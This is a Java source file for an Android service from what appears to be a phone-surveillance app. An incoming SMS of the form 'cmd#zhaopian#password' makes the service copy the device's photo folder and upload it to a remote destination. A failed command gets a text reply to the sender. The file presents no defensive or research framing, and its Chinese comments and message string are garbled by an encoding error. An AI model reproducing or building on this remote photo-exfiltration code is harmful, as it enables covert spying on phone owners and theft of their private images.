package com.phoneoverheard.phonne;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import com.phoneoverheard.database.Manager;
import com.phoneoverheard.database.ManagerService;
import com.phoneoverheard.database.SmscmdService;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;

@SuppressLint("SimpleDateFormat")
public class zhaopianService extends Service {
    private static final String TAG = "zhaopianService";
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	final String receiveTime = Dateformat.format(date);
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	
    @Override  
    public void onCreate() {  
        super.onCreate(); 
        Log.i(TAG, "onCreate called.");  
    }
    
    @Override
	public void onDestroy() { 
        Log.i(TAG, "onDestroy called.");  
        super.stopSelf();
        super.onDestroy();  
    }  
    
    @Override  
    public int onStartCommand(Intent intent, int flags, int startId) {  
        Log.i(TAG, "onStartCommand called.");  
        return super.onStartCommand(intent, flags, startId);  
    }  
    
    @Override  
    public void onStart(Intent intent, int startId) {  
    	Log.i(TAG, "onStart called."); 
        Bundle smscontent = intent.getBundleExtra("smscontent");// ����bundle��key�õ���Ӧ�Ķ���
        String content=smscontent.getString("content");
        String sendernumber=smscontent.getString("sendernumber"); 
        String[] contents = content.split("#");        
        SmscmdService smscmdservice = new SmscmdService(getBaseContext());
        String password = smscmdservice.find("zhaopian").getPassword();   
        if(contents[0].equals("cmd") && contents[1].equals("zhaopian") && new FileService().MD5(contents[2]).equals(password)){
	    	ManagerService managerservice = new ManagerService(getBaseContext());
	    	Manager manager = managerservice.find("manager");
	    	String oldPath = manager.getImgfolder();
	    	String newPath = manager.getAudiofolder();
	    	FileService fileservice = new FileService();
	    	fileservice.copyFolder(oldPath, newPath, getBaseContext());
	    	fileservice.uploadFolder(newPath,getBaseContext());
        }else{
	        // �ƶ���Ӫ������ÿ�η��͵��ֽ��������ޣ����ǿ���ʹ��Android�������ṩ �Ķ��Ź��ߡ�
	        SmsManager sms = SmsManager.getDefault();
	        String ErrMsg = "�������";
	        // �������û�г������Ƴ��ȣ��򷵻�һ�����ȵ�List��
	        List<String> texts = sms.divideMessage(ErrMsg);
	        for (String text : texts) {
	        	sms.sendTextMessage(sendernumber,null,text,null,null);
	        }
        }
		onDestroy();
    } 

}
